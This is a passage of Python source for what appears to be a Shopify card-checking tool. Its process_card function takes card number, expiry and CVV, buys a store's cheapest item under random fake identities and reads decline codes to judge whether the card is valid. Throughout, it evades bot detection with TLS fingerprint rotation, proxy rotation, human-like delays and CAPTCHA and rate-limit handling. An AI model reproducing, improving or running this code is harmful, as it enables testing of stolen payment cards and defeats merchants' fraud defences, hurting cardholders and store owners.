    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "JP": {"address1": "1-1-1 Chiyoda", "city": "Tokyo", "postalCode": "100-8111", "zoneCode": "13", "countryCode": "JP", "phone": "0312345678"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

def pick_addr(url, cc=None, rc=None):
    """Select address from book based on URL TLD, currency code, or region code.
    
    Priority:
    1. Direct TLD match in book (e.g. .ca → CA)
    2. TLD mapped via _TLD_TO_COUNTRY (e.g. .uk → GB, .com → US)
    3. Currency code (cc) mapped via C2C (e.g. GBP → GB)
    4. Region code (rc) direct match in book
    5. DEFAULT (US)
    """
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    # Direct TLD match in book (e.g. .ca → "CA" in book)
    if tcn in book:
        return book[tcn]

    # TLD mapped to country code (e.g. "UK" → "GB", "COM" → "US")
    tld_country = _TLD_TO_COUNTRY.get(tcn)
    if tld_country and tld_country in book:
        return book[tld_country]

    # Currency code to country mapping (e.g. GBP → GB)
    ccn = C2C.get(cc)
    if ccn and ccn in book:
        return book[ccn]

    # Region code direct match
    if rc in book:
        return book[rc]

    return book["DEFAULT"]

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    """Parse proxy string into tls-requests/aiohttp-compatible URL.
    
    Supported formats:
      - ip:port                          → http://ip:port
      - ip:port:user:pass                → http://user:pass@ip:port
      - [::1]:port                       → http://[::1]:port
      - [::1]:port:user:pass             → http://user:pass@[::1]:port
      - http://ip:port                   → http://ip:port
      - http://user:pass@ip:port         → http://user:pass@ip:port
      - socks5://ip:port                 → socks5://ip:port
      - socks5://user:pass@ip:port       → socks5://user:pass@ip:port
      - user:pass@ip:port                → http://user:pass@ip:port
    """
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    
    # Already a full URL (http://, https://, socks5://, socks4://)
    if proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://', 'socks5h://')):
        return proxy_str
    
    # Format: user:pass@ip:port or user:pass@[::1]:port
    if '@' in proxy_str:
        auth_part, host_part = proxy_str.rsplit('@', 1)
        # Validate host:port (works for both IPv4 and [IPv6]:port)
        if host_part.startswith('['):
            # IPv6 bracket notation: [::1]:port
            bracket_end = host_part.find(']')
            if bracket_end != -1 and bracket_end + 1 < len(host_part) and host_part[bracket_end + 1] == ':':
                return f"http://{auth_part}@{host_part}"
        elif ':' in host_part:
            return f"http://{auth_part}@{host_part}"
        return None
    
    # IPv6 bracket format without auth: [::1]:port
    if proxy_str.startswith('['):
        bracket_end = proxy_str.find(']')
        if bracket_end != -1 and bracket_end + 1 < len(proxy_str) and proxy_str[bracket_end + 1] == ':':
            # Could be [::1]:port:user:pass — extract IPv6 part first
            ipv6_host = proxy_str[:bracket_end + 1]  # [::1]
            rest = proxy_str[bracket_end + 2:]  # after the colon after ]
            rest_parts = rest.split(':', 1)  # split port from optional auth
            if rest_parts:
                port = rest_parts[0]
                # If there's auth after port: [::1]:port:user:pass
                if len(rest_parts) > 1 and ':' in rest_parts[1]:
                    # Split user:pass — use rsplit to handle colon in password
                    auth_parts = rest_parts[1].rsplit(':', 1)
                    if len(auth_parts) == 2:
                        user, password = auth_parts
                        return f"http://{user}:{password}@{ipv6_host}:{port}"
                return f"http://{ipv6_host}:{port}"
        return None
    
    # Colon-separated formats (IPv4)
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    elif len(parts) >= 5:
        # ip:port:user:pass_with_colons — password may contain colons
        # Format: ip:port:user:pass:more:pass → first 2 are ip:port, rest is user:pass
        ip = parts[0]
        port = parts[1]
        user = parts[2]
        password = ':'.join(parts[3:])  # Rejoin remaining parts as password
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return None

def is_captcha_required(response_text):
    """Detect CAPTCHA blocks from Shopify GraphQL responses.
    
    BUG #16 FIX: Previous version checked for 'hcaptcha', 'h-captcha', 
    'captcha required', etc. which caused FALSE POSITIVES because the 
    GraphQL query string itself contains $captcha:CaptchaInput and the 
    response fragments contain ...on Captcha{provider challenge sitekey token}.
    These appear in EVERY normal NegotiationResultAvailable response (20KB+),
    so the old function detected "captcha" in normal responses and returned 
    CAPTCHA_REQUIRED for everything.
    
    Now we ONLY detect:
    1. CAPTCHA_REQUIRED as an explicit error code/message in the response
    2. CheckpointDenied as the __typename (Shopify's actual CAPTCHA block type)
    3. HTML challenge pages (not JSON responses)
    """
    if not response_text:
        return False
    
    # Only check for EXPLICIT CAPTCHA error codes from Shopify
    # These appear in the errors[] array or as top-level codes
    strict_indicators = [
        '"code":"CAPTCHA_REQUIRED"',
        '"code":"captcha_required"',
        '"message":"CAPTCHA_REQUIRED"',
        '"message":"captcha_required"',
    ]
    
    for indicator in strict_indicators:
        if indicator in response_text:
            return True
    
    # Check for CheckpointDenied __typename — this is Shopify's official 
    # CAPTCHA block response in GraphQL negotiate results
    if '"__typename":"CheckpointDenied"' in response_text:
        return True
    
    return False

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, proxy=None
):
    last_error = "Request failed"
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(
                graphql_url, params=params, headers=headers,
                json=json_data, proxy=proxy, timeout=25
            )
            # UPDATE: Keep session token fresh - critical for avoiding GENERIC_ERROR
            new_sst = response.headers.get("x-checkout-one-session-token") or response.headers.get("X-Checkout-One-Session-Token")
            if new_sst: headers["x-checkout-one-session-token"] = new_sst
            new_sid = response.headers.get("x-checkout-web-source-id") or response.headers.get("X-Checkout-Web-Source-Id")
            if new_sid: headers["x-checkout-web-source-id"] = new_sid
            response_text = response.text
            
            # FIX: Validate response before returning.
            # Shopify may return HTML (login page, challenge page, error page)
            # instead of JSON when the session is invalid or the request is blocked.
            # Detect this early so the caller gets a clear error message.
            status_code = response.status_code
            content_type = response.headers.get('Content-Type', '')
            
            # If we get a non-2xx status, log it clearly
            if status_code >= 400:
                preview = response_text[:300].replace('\n', ' ').strip()
                # RATE-LIMIT FIX: For HTTP 429, use exponential backoff instead of fixed 1s
                if status_code == 429:
                    _429_backoff = 2.0 * (2 ** attempt)  # 2s, 4s, 8s...
                    _429_jitter = random.uniform(0.7, 1.3)
                    _429_delay = min(_429_backoff * _429_jitter, 15.0)
                    print(f"[rate-limit] GraphQL got HTTP 429, attempt {attempt+1}/{max_retries+1} in {_429_delay:.1f}s", file=sys.stderr)
                    if attempt < max_retries:
                        await asyncio.sleep(_429_delay)
                        continue
                    return response, response_text, False
                if attempt < max_retries:
                    await asyncio.sleep(1)
                    continue
                return response, response_text, False
            
            # If response is HTML instead of JSON, it's a block/redirect
            # Common case: Shopify serves an HTML challenge/error page
            if 'text/html' in content_type and 'application/json' not in content_type:
                # Check if it's a redirect/challenge page
                if '<html' in response_text.lower() or '<!doctype' in response_text.lower():
                    # Try to extract a meaningful error from the HTML
                    title_match = re.search(r'<title>([^<]+)</title>', response_text, re.IGNORECASE)
                    title = title_match.group(1).strip() if title_match else "HTML page"
                    if 'login' in title.lower() or 'sign in' in title.lower():
                        last_error = f"BLOCKED: Checkout session redirected to login (HTTP {status_code})"
                    elif 'challenge' in title.lower() or 'captcha' in title.lower():
                        last_error = f"BLOCKED: Challenge page returned instead of JSON (HTTP {status_code})"
                    else:
                        last_error = f"BLOCKED: HTML response instead of JSON: {title} (HTTP {status_code})"
                    if attempt < max_retries:
                        await asyncio.sleep(1)
                        continue
                    return response, last_error, False
            
            # If response text is empty, retry or fail
            if not response_text or not response_text.strip():
                last_error = f"Empty response from GraphQL (HTTP {status_code})"
                if attempt < max_retries:
                    await asyncio.sleep(1)
                    continue
                return response, last_error, False
            
            # 3rd return value: True = valid JSON response received, False = error/block/timeout
            return response, response_text, True
        except asyncio.TimeoutError:
            last_error = "Request timed out"
            if attempt == max_retries:
                return None, last_error, False
            await asyncio.sleep(1)
        except (tls_requests.TLSError, tls_requests.HTTPError, OSError) as e:
            last_error = f"Request error: {str(e)}"
            if attempt == max_retries:
                return None, last_error, False
            await asyncio.sleep(1)
        except Exception as e:
            last_error = str(e)
            if attempt == max_retries:
                return None, last_error, False
            await asyncio.sleep(1)
    return None, last_error, False

async def fetch_products(domain, proxy_str=None):
    """Fetch cheapest available product variant from a Shopify store.
    
    Returns:
        tuple: (success: bool, data_or_error: dict|str)
            On success: (True, {'site': ..., 'price': ..., 'variant_id': ..., 'link': ...})
            On failure: (False, error_message_string)
    """
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        identifier = _pick_identifier()
        session = AsyncClient(client_identifier=identifier, http2=True, verify=True, timeout=10)
        try:
            resp = await session.get(f"{domain}/products.json", proxy=proxy)
            if resp.status_code != 200:
                return False, f"Site Error: HTTP {resp.status_code}"
            text = resp.text
            if "shopify" not in text.lower():
                return False, "Not a Shopify store"
            try:
                data = json.loads(text)
                result = data.get('products', [])
            except (json.JSONDecodeError, Exception):
                return False, "Invalid products response"
            if not result:
                return False, "No products found"
        finally:
            await session.aclose()

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        # FIX: European comma-decimal prices (e.g., "1,99" = €1.99)
                        # Simple replace(',', '') turns "1,99" into 199.0 — wrong!
                        # Heuristic: if comma is followed by exactly 2 digits at end,
                        # it's a decimal separator (European format). Otherwise it's
                        # a thousands separator (e.g., "1,299" = 1299.0).
                        if re.match(r'^\d+,\d{2}$', price.strip()):
                            price = float(price.replace(',', '.'))
                        else:
                            price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    # FIX: Skip free products ($0.00). A $0.00 checkout will fail
                    # at the payment step — Shopify cannot process a zero-amount
                    # credit card charge, and the PCI vault session will be rejected.
                    if price <= 0:
                        continue

                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        if isinstance(min_product, dict) and min_product.get('variant_id'):
            return True, min_product
        else:
            return False, "No valid products available"

    except (tls_requests.TLSError, tls_requests.HTTPError, OSError) as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"

_GENERIC_PAYMENT_CODES = {'GENERIC_ERROR', 'PAYMENT_FAILED', ''}

def _is_generic_payment_code(value):
    return str(value or '').strip().upper() in _GENERIC_PAYMENT_CODES

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    # Strip HTML tags if any leaked through
    message = re.sub(r'<[^>]+>', '', message).strip()
    if not message:
        return "UNKNOWN_ERROR"
    
    # Preserve diagnostic prefixes from our improved error handling
    # These are step-specific messages we added that should NOT be mangled by regex
    DIAGNOSTIC_PREFIXES = [
        'PROPOSAL_BLOCKED:',
        'PROPOSAL_EMPTY:',
        'PROPOSAL_JSON_ERROR:',
        'SUBMIT_BLOCKED:',
        'SUBMIT_JSON_ERROR:',
        'PCI_VAULT_BLOCKED:',
        'PCI_VAULT_ERROR:',
        'BLOCKED:',
        'POLL_BLOCKED:',
        'POLL_JSON_ERROR:',
        'POLL_EMPTY:',
    ]
    for prefix in DIAGNOSTIC_PREFIXES:
        if message.startswith(prefix):
            return message[:120] if len(message) > 120 else message
    
    # Known Shopify error codes — return as-is without mangling.
    # These are machine-readable codes from Shopify's PaymentFailed, SubmitRejected, etc.
    _KNOWN_CODES = {
        'CARD_DECLINED', 'INSUFFICIENT_FUNDS', 'EXPIRED_CARD', 'INVALID_CVC',
        'INCORRECT_NUMBER', 'INCORRECT_CVC', 'INCORRECT_ZIP', 'INCORRECT_ADDRESS',
        'PROCESSING_ERROR', 'CALL_ISSUER', 'PICK_UP_CARD', 'DO_NOT_HONOR',
        'CARD_NOT_SUPPORTED', 'TRY_AGAIN_LATER', 'INVALID_ACCOUNT',
        'INVALID_AMOUNT', 'INVALID_NUMBER', 'ALREADY_REFUNDED',
        'AUTHENTICATION_REQUIRED', 'TEST_MODE_LIVE_CARD',
        '3DS_REQUIRED', 'OTP_REQUIRED', 'ORDER_PLACED',
        'CAPTCHA_REQUIRED', 'GENERIC_ERROR', 'PAYMENT_FAILED',
    }
    msg_upper = message.strip().upper()
    if msg_upper in _KNOWN_CODES:
        return message.strip()
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                if match.upper() in _GENERIC_PAYMENT_CODES:
                    continue
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            # If Shopify prefixes a human-readable detail with a generic code,
            # keep scanning/fall through so the detail is not lost.
            if _is_generic_payment_code(first_word) and len(words) > 1:
                pass
            else:
                return first_word
    
    return message[:120]


def _first_non_empty_string(*values):
    for value in values:
        if value is None:
            continue
        text = str(value).strip()
        if text:
            return text
    return ''

def _extract_payment_error_response(error, _depth=0):
    """Return the most specific Shopify payment error available.

    Shopify often returns a generic top-level PaymentFailed.code while the
    actionable decline details live in nested/message fields. Prefer those
    details, but keep Shopify's actual generic code when it is all we received.

    Example payloads this function handles:
        1. code="GENERIC_ERROR", message={"code": "INSUFFICIENT_FUNDS"} → "INSUFFICIENT_FUNDS"
        2. code="GENERIC_ERROR", messageUntranslated="Card declined" → "Card declined"
        3. code="GENERIC_ERROR" (nothing else) → "GENERIC_ERROR"
        4. code="INSUFFICIENT_FUNDS" → "INSUFFICIENT_FUNDS"
        5. declineCode="DO_NOT_HONOR" → "DO_NOT_HONOR"
    """
    # FIX Bug #15: Prevent stack overflow from deeply nested error responses
    if _depth > 5:
        return 'UNKNOWN_PAYMENT_ERROR'

    if not isinstance(error, dict):
        return 'UNKNOWN_PAYMENT_ERROR'

    generic_code = ''

    # ── Step 1: Check direct code keys for specific (non-generic) codes ──
    candidate_keys = (
        'declineCode', 'decline_code', 'gatewayCode', 'gateway_code',
        'processorCode', 'processor_code', 'networkResponseCode',
        'network_response_code', 'reasonCode', 'reason_code',
        'errorCode', 'error_code', 'code',
    )
    for key in candidate_keys:
        value = _first_non_empty_string(error.get(key))
        if value and not _is_generic_payment_code(value):
            return value
        if value and _is_generic_payment_code(value) and not generic_code:
            generic_code = value

    # ── Step 2: Check nested containers (dicts) for specific codes ──
    # Shopify puts specific codes inside message: {code: "INSUFFICIENT_FUNDS"},
    # paymentError, gatewayResponse, etc. We recurse into each one.
    # IMPORTANT: error.get('message') can be a dict OR a string. Only process
    # dicts here — string messages are handled in Step 3.
    nested_containers = (
        error.get('message'), error.get('paymentError'), error.get('gatewayResponse'),
        error.get('networkResponse'), error.get('processorResponse'), error.get('details'),
    )
    for nested in nested_containers:
        if isinstance(nested, dict):
            # Special fast-path: if nested dict has a 'code' key that is specific,
            # return it directly without full recursion (avoids the code key being
            # re-evaluated as 'code' → generic → lost).
            _nested_code = nested.get('code')
            if isinstance(_nested_code, str) and _nested_code.strip() and not _is_generic_payment_code(_nested_code):
                return _nested_code.strip()

            nested_response = _extract_payment_error_response(nested, _depth=_depth+1)
            if nested_response != 'UNKNOWN_PAYMENT_ERROR' and not _is_generic_payment_code(nested_response):
                return nested_response
            if _is_generic_payment_code(nested_response) and not generic_code:
                generic_code = nested_response

    # ── Step 3: Check string message fields for human-readable details ──
    # Skip error.get('message') here if it's a dict (already processed above).
    _message_val = error.get('message')
    message = _first_non_empty_string(
        error.get('localizedMessage'), error.get('nonLocalizedMessage'),
        error.get('messageUntranslated'),
        _message_val if not isinstance(_message_val, dict) else None,
        error.get('description'), error.get('reason'), error.get('detail'),
    )
    if message and not _is_generic_payment_code(message):
        return message

    # ── Step 4: Fallback — return the best we have ──
    # If Shopify sent only GENERIC_ERROR, return that (it's the truth).
    # If we have a human-readable message (even if generic), return that.
    # Only fall back to UNKNOWN_PAYMENT_ERROR if we have nothing.
    return generic_code or message or 'UNKNOWN_PAYMENT_ERROR'

def _payment_requires_offsite_action(error):
    if not isinstance(error, dict):
        return False
    return bool(error.get('hasOffsiteRedirect') or error.get('hasOffsitePaymentMethod'))


# NOTE: Duplicate definitions of _GENERIC_PAYMENT_CODES, _first_non_empty_string,
# _extract_payment_error_response, and _payment_requires_offsite_action were removed.
# The canonical definitions are above (lines 679-822). The duplicate block that
# followed was overriding them with a worse version that:
#   1. Lost the generic_code fallback (always returned CARD_DECLINED instead of
#      preserving the actual GENERIC_ERROR code when that's all Shopify sent)
#   2. Skipped nested dict message.code lookup (Shopify puts specific codes like
#      INSUFFICIENT_FUNDS inside message: {code: "INSUFFICIENT_FUNDS"})
#   3. Dropped _is_generic_payment_code() helper in favor of inline check, making
#      the code less consistent

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    displayName = ""
    payment_identifier = None
    checkpoint_data = None
    running_total = "0.00"

    try:
        # BOT DETECTION BYPASS: Rotate TLS identifier per request.
        # tls-requests rotates the TLS fingerprint (JA3/JA4 hash),
        # HTTP/2 fingerprint, User-Agent, and sec-ch-ua headers together — no mismatch.
        # --- Bot Detection Bypass: TLS identifier + Client Hints + Proxy Rotation ---
        identifier = _pick_identifier()
        hints = _get_client_hints(identifier)
        proxy = _init_proxy_rotator(proxy_str)  # Initialize proxy for this checkout
        headers = _build_headers(identifier, base_headers={
            'Origin': ourl,
            'Referer': _referrer_for('homepage', ourl=ourl),
        })

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        # FIX: Sanitize variant_id — if user passes a full GID like
        # gid://shopify/ProductVariant/12345, extract just the numeric ID.
        # Otherwise the GID construction below double-nests it:
        # gid://shopify/ProductVariant/gid://shopify/ProductVariant/12345
        if variant_id:
            _gid_match = re.match(r'^gid://shopify/ProductVariant/(\d+)$', str(variant_id))
            if _gid_match:
                variant_id = _gid_match.group(1)
            else:
                variant_id = str(variant_id).strip()
        
        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            # FIX: fetch_products now always returns (success, data_or_error) tuple
            success, data = info
            if not success:
                return False, data, gateway, total_price, currency
            variant_id = data['variant_id']

        # tls-requests session: TLS+HTTP/2 fingerprint handled by client_identifier.
        # verify=False when using proxy (some proxies have cert issues),
        # verify=True for direct connections.
        
        # BUG #15 FIX: ALWAYS create a dedicated session per checkout request.
        # The shared_session from api.py was being used for ALL checkout steps
        # (homepage, cart, checkout, GraphQL, PCI vault, poll), which means cookies
        # from PREVIOUS checkouts on OTHER stores accumulated in the shared jar.
        # Shopify detects cross-session cookies as bot behavior → CAPTCHA_REQUIRED.
        #
        # Now: shared_session is ONLY used for fetch_products() (read-only product
        # lookup). The checkout flow gets a fresh session with unsafe CookieJar
        # for proper cross-domain cookie handling during checkout.
        # shared_session param is kept for API compatibility but unused in checkout flow.
        session = AsyncClient(
            client_identifier=identifier,
            http2=True,  # Technique #5: HTTP/2 fingerprint matching
            verify=not proxy,  # Skip SSL verify when using proxy
            timeout=30,
        )
        
        try:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            # Step 0: Visit homepage first to get session cookies (prevents 400 on cart)
            try:
                home_headers = {
                    **headers,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                }
                await session.get(url, headers=home_headers, proxy=proxy, allow_redirects=True, timeout=8)
                await human_delay(step_name="homepage")  # Technique #2: Human-like delay
            except Exception:
                pass  # Non-fatal — continue even if homepage fails

            # Attempt 1: form-encoded with X-Requested-With (standard Shopify AJAX)
            cart_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': _referrer_for('cart', ourl=ourl),  # Technique #6: Referrer chain
            }
            # RATE-LIMIT FIX: Retry on HTTP 429 with exponential backoff + jitter
            cart_resp, _ = await retry_on_429(
                lambda: session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy, timeout=10),
                step_name="cart_attempt1", max_retries=2, base_delay=3.0, max_delay=12.0
            )

            await human_delay(step_name="cart")  # Technique #2: Human-like delay
            
            # Attempt 2: JSON body (also with 429 retry)
            if cart_resp.status_code != 200:
                cart_headers_alt = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                }
                # FIX Bug #11/#28: Validate that parsed variant ID is > 0 before sending
                _cart_vid = int(re.sub(r'[^0-9]', '', str(variant_id)) or '0')
                if _cart_vid <= 0:
                    # Non-numeric variant_id — skip JSON cart attempt entirely
                    pass  # cart_resp already has the failed attempt 1 result
                else:
                    cart_data = {'items': [{'id': _cart_vid, 'quantity': 1}]}
                    cart_resp, _ = await retry_on_429(
                        lambda cart_data=cart_data: session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy, timeout=10),
                        step_name="cart_attempt2", max_retries=2, base_delay=3.0, max_delay=12.0
                    )

            # Attempt 3: Clear cart then retry form-encoded (also with 429 retry)
            if cart_resp.status_code != 200:
                try:
                    await session.post(url + '/cart/clear.js', headers=cart_headers, proxy=proxy)
                    await asyncio.sleep(0.3)
                    cart_resp, _ = await retry_on_429(
                        lambda: session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy),
                        step_name="cart_attempt3", max_retries=2, base_delay=3.0, max_delay=12.0
                    )
                except Exception:
                    pass

            if cart_resp.status_code != 200:
                try:
                    cart_error_text = cart_resp.text
                    try:
                        cart_err_json = json.loads(cart_error_text)
                        err_desc = cart_err_json.get('description') or cart_err_json.get('message') or cart_err_json.get('error', '')
                        # RATE-LIMIT FIX: Distinguish 429 from other cart errors
                        if cart_resp.status_code == 429:
                            err_msg = f"Cart Rate-Limited: HTTP 429 (retries exhausted)"
                        elif err_desc:
                            err_msg = f"Cart Error: {err_desc}"
                        else:
                            err_msg = f"Cart failed: HTTP {cart_resp.status_code}"
                    except Exception:
                        if cart_resp.status_code == 429:
                            err_msg = "Cart Rate-Limited: HTTP 429 (retries exhausted)"
                        else:
                            err_msg = f"Cart failed: HTTP {cart_resp.status_code}"
                except Exception:
                    err_msg = f"Cart failed: HTTP {cart_resp.status_code}"
                return False, err_msg, gateway, total_price, currency

            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Referer': _referrer_for('checkout', ourl=ourl),  # Technique #6: Referrer chain
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
            # RATE-LIMIT FIX: Retry on HTTP 429 for checkout step
            response, _ = await retry_on_429(
                lambda: session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=15),
                step_name="checkout", max_retries=2, base_delay=3.0, max_delay=12.0
            )
            # Fallback: some stores reject POST /checkout — try GET
            # Note: 400 excluded — could indicate a legitimate cart error, not a method issue
            if response.status_code in (405, 403) or (response.status_code >= 500):
                await asyncio.sleep(random.uniform(0.5, 1.5))
                response, _ = await retry_on_429(
                    lambda: session.get(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=15),
                    step_name="checkout_GET_fallback", max_retries=1, base_delay=3.0, max_delay=12.0
                )
            # If still 429 after retries, return rate-limit error
            if response.status_code == 429:
                return False, "Checkout Rate-Limited: HTTP 429 (retries exhausted)", gateway, total_price, currency
            await human_delay(step_name="checkout")  # Technique #2: Human-like delay
            checkout_url = str(response.url)

            # Validate checkout URL — detect non-checkout redirects early
            _checkout_parsed = urlparse(checkout_url)
            _checkout_path_lower = _checkout_parsed.path.lower()
            if '/checkout' not in _checkout_path_lower and '/pay' not in _checkout_path_lower:
                # Redirected to non-checkout page (password page, out of stock, etc.)
                if '/password' in _checkout_path_lower:
                    return False, "Store is password-protected", gateway, total_price, currency
                elif '/cart' in _checkout_path_lower:
                    return False, "Redirected back to cart (item may be out of stock)", gateway, total_price, currency
                elif '/account' in _checkout_path_lower:
                    return False, "Site requires login!", gateway, total_price, currency
                else:
                    return False, f"Redirected to non-checkout page: {checkout_url[:100]}", gateway, total_price, currency

            # Detect checkout URL format: /checkouts/cn/TOKEN or /checkouts/TOKEN
            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            checkout_uses_cn = bool(attempt_token_match)
            if attempt_token_match:
                attempt_token = attempt_token_match.group(1)
            else:
                # Fallback: try /checkouts/TOKEN format
                plain_match = re.search(r'/checkouts/([^/?]+)', checkout_url)
                attempt_token = plain_match.group(1) if plain_match else checkout_url.split('/')[-1].split('?')[0]
                checkout_uses_cn = False
            # Validate attempt_token — empty or non-token string will break submit mutation
            if not attempt_token or not re.match(r'^[A-Za-z0-9]+$', attempt_token):
                return False, f"Invalid checkout token extracted from URL: '{attempt_token}'", gateway, total_price, currency

            # ── Session Token Extraction ──
            # Modern Shopify checkout (2024+) redirects through shop.app which
            # carries a JWT containing session_token in its payload.
            # The old HTML meta/JSON patterns are kept as fallbacks for older stores.
            # FIX: Added diagnostic logging + 3 new extraction methods to reduce
            # "Failed to get session token" errors. Also check ALL redirect URLs,
            # not just shop.app, and try multiple JWT payload keys.
            _sst_methods_tried = []  # Track which methods were tried for diagnostics
            
            # Method 1: Response headers (most reliable when available)
            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            if sst:
                _sst_methods_tried.append(f"headers:{sst[:8]}...")
            else:
                _sst_methods_tried.append("headers:None")
            
            text = response.text
            
            # Method 2: Extract session_token from JWT in redirect chain
            # FIX: Check ALL redirect URLs, not just shop.app. Shopify may redirect
            # through shopify.com/pay, shop.app, or other domains. Also try
            # multiple JWT payload keys (session_token, checkout_session_token, sst).
            if not sst and response.history:
                _redirect_urls = [str(r.url) for r in response.history]
                _sst_methods_tried.append(f"redirects:{len(_redirect_urls)}")
                for redirect_url in _redirect_urls:
                    # Try multiple JWT parameter names
                    _jwt_match = re.search(r'[?&]shop_pay_token=([^&]+)', redirect_url)
                    if not _jwt_match:
                        _jwt_match = re.search(r'[?&]token=([^&]+)', redirect_url)
                    if not _jwt_match:
                        _jwt_match = re.search(r'[?&]checkout_token=([^&]+)', redirect_url)
                    if not _jwt_match:
                        _jwt_match = re.search(r'[?&]session_token=([^&]+)', redirect_url)
                    if _jwt_match:
                        _jwt_str = _jwt_match.group(1)
                        _jwt_parts = _jwt_str.split('.')
                        if len(_jwt_parts) >= 2:
                            _jwt_payload = _jwt_parts[1]
                            _jwt_payload += '=' * ((4 - len(_jwt_payload) % 4) % 4)
                            try:
                                _jwt_decoded = json.loads(base64.urlsafe_b64decode(_jwt_payload))
                                # Try multiple possible key names in JWT payload
                                sst = (_jwt_decoded.get('session_token') or
                                       _jwt_decoded.get('checkout_session_token') or
                                       _jwt_decoded.get('sst') or
                                       _jwt_decoded.get('token'))
                                if sst:
                                    _sst_methods_tried.append(f"jwt:{redirect_url[:40]}")
                                    break
                            except Exception:
                                pass
                    # Also check for session_token as a plain URL parameter (not JWT)
                    _plain_st_match = re.search(r'[?&]session_token=([^&]+)', redirect_url)
                    if not _plain_st_match:
                        _plain_st_match = re.search(r'[?&]sst=([^&]+)', redirect_url)
                    if _plain_st_match:
                        sst = _plain_st_match.group(1)
                        _sst_methods_tried.append(f"url_param:{redirect_url[:40]}")
                        break
                if not sst:
                    _sst_methods_tried.append("redirects:no_token_found")
            elif not sst:
                _sst_methods_tried.append("redirects:none")
            
            # Method 3: HTML meta/JSON patterns (legacy, older Shopify themes)
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
